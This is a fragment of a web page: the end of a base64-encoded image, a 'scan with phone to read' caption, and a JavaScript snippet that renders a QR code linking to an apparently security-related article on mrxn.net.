PMyc+NfJj4cA1YEx+halZ5aCvhz6+UlM10NeDY9jxbD/pdd+QnMSb4D2Q00H8frL96GRcOterYjSVkw++lsmfofSxIx24X3TCUSvuyEZt4pV+zIHXBpJqONa3xKcz5hJ/pton0L1JWGnuG9KO6z2c9k0dPD24jmcvIdMH91tpownCsRbWOTAPrJbYOKB7MkWCOegxe6kofTVwTeXiw3EuPcEaMKZWeN8QncIbWRtIpncFj/YPnjjQJOkXAtieVtgxuTNtNCOmRjjmEisnS7xC5WWw7wvsr/RHnHrIVnlwP+WrVW0bSCVv/3UnMA0EPEWY8WibmfYqD+6TXLTCcCMqJ6u8Ylk4cF+YcdSMMRCq/Ze3wHZztUasiQZnlQfXQ4+1dFWnfHjhNBAJbnvdCdwDed3ZL1f+1oHoysXAVzerjjyQ1ITA9uVjSnwS6bPCz/Tlz9SnIDF4bdh/Qh1NEKxJLEz9GYLr4Bi/dSDa2G3/7gS+ZSAwT3x8UsCaut1owDkwRpO8MBxYA8bwQulWppys5hTLwH3AuNJIVy2ayh354L5wfONq7bcMpDa8/X93AtNAMv0VHi0V7SoPfkKiqQjr3Fmf5NIH3AN2jOYMwfr0OdMmB65JfAXTXwiul39k00CuLHJrfu4E2kDA04PHeLSdOvVRA+478qs4fcA1QJONuZYoDtC9S4M+lvSoD1gLO0pfDZxLD2HNVx+sBSrd+cC2X+D+L/4+3uyj3ZA329dfu53/AwAA///UbdwvAAAABklEQVQDAKy6VLBsoJ3JAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/easy7-file-downloadNote-file-read.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 